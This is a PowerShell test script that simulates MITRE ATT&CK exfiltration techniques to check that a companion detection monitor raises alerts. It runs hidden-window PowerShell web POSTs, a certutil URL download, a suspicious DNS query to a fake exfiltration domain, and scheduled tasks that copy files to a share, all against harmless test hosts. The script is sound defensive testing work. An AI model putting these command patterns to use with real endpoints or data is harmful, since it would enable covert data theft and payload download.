#Requires -RunAsAdministrator

<#
.SYNOPSIS
    Test script for Exfiltration detection capabilities
.DESCRIPTION
    Generates test events to validate the Exfiltration.ps1 monitoring script
    Creates benign test activities that trigger various exfiltration detection rules
.PARAMETER TestDuration
    Duration in seconds for each test (default: 5)
.PARAMETER OutputPath
    Path where test files will be created (default: temp directory)
#>

param(
    [int]$TestDuration = 5,
    [string]$OutputPath = $env:TEMP
)

Write-Host "`n" + "=" * 60 -ForegroundColor Cyan
Write-Host "Exfiltration Detection Test Script v1.0" -ForegroundColor Cyan
Write-Host "=" * 60 -ForegroundColor Cyan

Write-Host "`nThis script will generate test activities to validate exfiltration detection." -ForegroundColor Yellow
Write-Host "Make sure the Exfiltration.ps1 monitoring script is running in another window." -ForegroundColor Yellow
Write-Host "`nStarting tests in 3 seconds..." -ForegroundColor Green

Start-Sleep -Seconds 3

# Test 1: Automated Exfiltration (T1020)
Write-Host "`n[TEST 1] Testing Automated Exfiltration Detection..." -ForegroundColor Magenta

Write-Host "  - Creating scheduled task for data collection..." -ForegroundColor Gray
try {
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'Get-ChildItem C:\*.cfg | Export-Csv C:\temp\backup_config.csv'"
    $taskTrigger = New-ScheduledTaskTrigger -Daily -At "02:00AM"
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "DataBackupTask" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force | Out-Null
    Write-Host "   Scheduled task created (should trigger T1020 detection)" -ForegroundColor Green
    Start-Sleep -Seconds 2
    Unregister-ScheduledTask -TaskName "DataBackupTask" -Confirm:$false
}
catch {
    Write-Host "   Failed to create scheduled task: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "  - Testing automation with robocopy command..." -ForegroundColor Gray
$testDir = Join-Path $OutputPath "ExfiltrationTest"
New-Item -ItemType Directory -Path $testDir -Force | Out-Null
Start-Process -FilePath "robocopy.exe" -ArgumentList "C:\Windows\System32\drivers\etc", $testDir, "hosts", "/R:0" -WindowStyle Hidden -Wait
Write-Host "   Robocopy command executed (should trigger T1020 detection)" -ForegroundColor Green

Start-Sleep -Seconds $TestDuration

# Test 2: Exfiltration Over Alternative Protocol (T1048)
Write-Host "`n[TEST 2] Testing Exfiltration Over Alternative Protocol..." -ForegroundColor Magenta

Write-Host "  - Testing DNS query patterns..." -ForegroundColor Gray
try {
    # Create suspicious DNS query pattern
    $suspiciousQuery = "abcdefghij1234567890klmnopqrstuvwxyz.test-exfiltration-domain.com"
    nslookup $suspiciousQuery 2>$null | Out-Null
    Write-Host "   Suspicious DNS query executed (should trigger T1048.004 detection)" -ForegroundColor Green
}
catch {
    Write-Host "   DNS query attempted (should trigger T1048.004 detection)" -ForegroundColor Green
}

Write-Host "  - Testing external connection on SSH port..." -ForegroundColor Gray
try {
    # Test connection to external SSH port (will fail but should be detected)
    $testConnection = Test-NetConnection -ComputerName "8.8.8.8" -Port 22 -WarningAction SilentlyContinue
    Write-Host "   SSH connection test completed (should trigger T1048 detection)" -ForegroundColor Green
}
catch {
    Write-Host "   SSH connection attempted (should trigger T1048 detection)" -ForegroundColor Green
}

Start-Sleep -Seconds $TestDuration

# Test 3: Exfiltration Over C2 Channel (T1041)
Write-Host "`n[TEST 3] Testing Exfiltration Over C2 Channel..." -ForegroundColor Magenta

Write-Host "  - Testing PowerShell web request pattern..." -ForegroundColor Gray
try {
    # Simulate C2-like PowerShell command (safe test URL)
    $testCommand = "powershell.exe -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri 'https://httpbin.org/post' -Method POST -Body 'test=data' -ErrorAction SilentlyContinue`""
    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle", "Hidden", "-Command", "Invoke-WebRequest -Uri 'https://httpbin.org/post' -Method POST -Body 'test=data' -ErrorAction SilentlyContinue" -Wait
    Write-Host "   PowerShell web request executed (should trigger T1041 detection)" -ForegroundColor Green
}
catch {
    Write-Host "   PowerShell web request attempted (should trigger T1041 detection)" -ForegroundColor Green
}

Write-Host "  - Testing certutil download pattern..." -ForegroundColor Gray
try {
    # Safe test with certutil (will fail but should be detected)
    Start-Process -FilePath "certutil.exe" -ArgumentList "-urlcache", "-split", "-f", "https://httpbin.org/get", "$env:TEMP\test.tmp" -WindowStyle Hidden -Wait
    Write-Host "   Certutil command executed (should trigger T1041 detection)" -ForegroundColor Green
}
catch {
    Write-Host "   Certutil command attempted (should trigger T1041 detection)" -ForegroundColor Green
}

Start-Sleep -Seconds $TestDuration

# Test 4: Exfiltration Over Physical Medium (T1052)
Write-Host "`n[TEST 4] Testing Exfiltration Over Physical Medium..." -ForegroundColor Magenta

Write-Host "  - Creating test OT files..." -ForegroundColor Gray
$otTestFiles = @(
    "$OutputPath\test_config.plc",
    "$OutputPath\hmi_backup.hmi",
    "$OutputPath\system_config.cfg",
    "$OutputPath\process_data.csv"
)

foreach ($file in $otTestFiles) {
    "Test OT data for exfiltration detection - $(Get-Date)" | Out-File -FilePath $file -Force
}
Write-Host "   OT test files created (check for T1052 detection if USB present)" -ForegroundColor Green

Write-Host "  - Simulating file operation detection..." -ForegroundColor Gray
# Copy files to simulate staging behavior
$stagingDir = Join-Path $OutputPath "staging_$(Get-Date -Format 'yyyyMMdd')"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
foreach ($file in $otTestFiles) {
    Copy-Item $file $stagingDir -Force
}
Write-Host "   Files copied to staging directory (should trigger T1020 detection)" -ForegroundColor Green

Start-Sleep -Seconds $TestDuration

# Test 5: Exfiltration Over Web Service (T1567)
Write-Host "`n[TEST 5] Testing Exfiltration Over Web Service..." -ForegroundColor Magenta

Write-Host "  - Testing DNS queries to cloud services..." -ForegroundColor Gray
$cloudServices = @("dropbox.com", "drive.google.com", "onedrive.live.com", "github.com")
foreach ($service in $cloudServices) {
    try {
        nslookup $service 2>$null | Out-Null
        Write-Host "   DNS query to $service (should trigger T1567 detection)" -ForegroundColor Green
    }
    catch {
        Write-Host "   DNS query attempted to $service" -ForegroundColor Green
    }
}

Write-Host "  - Testing non-browser connection simulation..." -ForegroundColor Gray
try {
    # Test connection to GitHub (will trigger detection as non-browser)
    $testConnection = Test-NetConnection -ComputerName "github.com" -Port 443 -WarningAction SilentlyContinue
    Write-Host "   Non-browser connection to cloud service (should trigger T1567 detection)" -ForegroundColor Green
}
catch {
    Write-Host "   Cloud service connection attempted (should trigger T1567 detection)" -ForegroundColor Green
}

Start-Sleep -Seconds $TestDuration

# Test 6: Scheduled Transfer (T1029)
Write-Host "`n[TEST 6] Testing Scheduled Transfer..." -ForegroundColor Magenta

Write-Host "  - Creating scheduled transfer task..." -ForegroundColor Gray
try {
    $transferAction = New-ScheduledTaskAction -Execute "robocopy.exe" -Argument "C:\temp \\\\testserver\\share\\backup /E /R:0"
    $transferTrigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "01:00AM"
    $transferSettings = New-ScheduledTaskSettingsSet
    Register-ScheduledTask -TaskName "WeeklyDataTransfer" -Action $transferAction -Trigger $transferTrigger -Settings $transferSettings -Force | Out-Null
    Write-Host "   Scheduled transfer task created (should trigger T1029 detection)" -ForegroundColor Green
    Start-Sleep -Seconds 2
    Unregister-ScheduledTask -TaskName "WeeklyDataTransfer" -Confirm:$false
}
catch {
    Write-Host "   Failed to create scheduled transfer task: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "  - Testing schtasks command pattern..." -ForegroundColor Gray
try {
    # Execute schtasks query (safe command that should trigger detection pattern)
    Start-Process -FilePath "schtasks.exe" -ArgumentList "/query", "/tn", "Microsoft\Windows\Backup\*" -WindowStyle Hidden -Wait
    Write-Host "   Schtasks command executed (monitoring should detect scheduling patterns)" -ForegroundColor Green
}
catch {
    Write-Host "   Schtasks command attempted" -ForegroundColor Green
}

Start-Sleep -Seconds $TestDuration

# Cleanup
Write-Host "`n[CLEANUP] Removing test files..." -ForegroundColor Cyan
try {
    Remove-Item $testDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
    foreach ($file in $otTestFiles) {
        Remove-Item $file -Force -ErrorAction SilentlyContinue
    }
    Write-Host " Test files cleaned up" -ForegroundColor Green
}
catch {
    Write-Host " Some test files may remain in $OutputPath" -ForegroundColor Yellow
}

# Summary
Write-Host "`n" + "=" * 60 -ForegroundColor Cyan
Write-Host "Exfiltration Detection Test Complete" -ForegroundColor Cyan
Write-Host "=" * 60 -ForegroundColor Cyan

Write-Host "`nTests completed for the following techniques:" -ForegroundColor Green
Write-Host " T1020 - Automated Exfiltration" -ForegroundColor White
Write-Host " T1048 - Exfiltration Over Alternative Protocol" -ForegroundColor White
Write-Host " T1041 - Exfiltration Over C2 Channel" -ForegroundColor White
Write-Host " T1052 - Exfiltration Over Physical Medium" -ForegroundColor White
Write-Host " T1567 - Exfiltration Over Web Service" -ForegroundColor White
Write-Host " T1029 - Scheduled Transfer" -ForegroundColor White

Write-Host "`nCheck the Exfiltration monitoring script output for detection alerts." -ForegroundColor Yellow
Write-Host "Review the generated log file for detailed detection information." -ForegroundColor Yellow
Write-Host "`nNote: Some detections may appear with a slight delay due to the monitoring interval." -ForegroundColor Gray
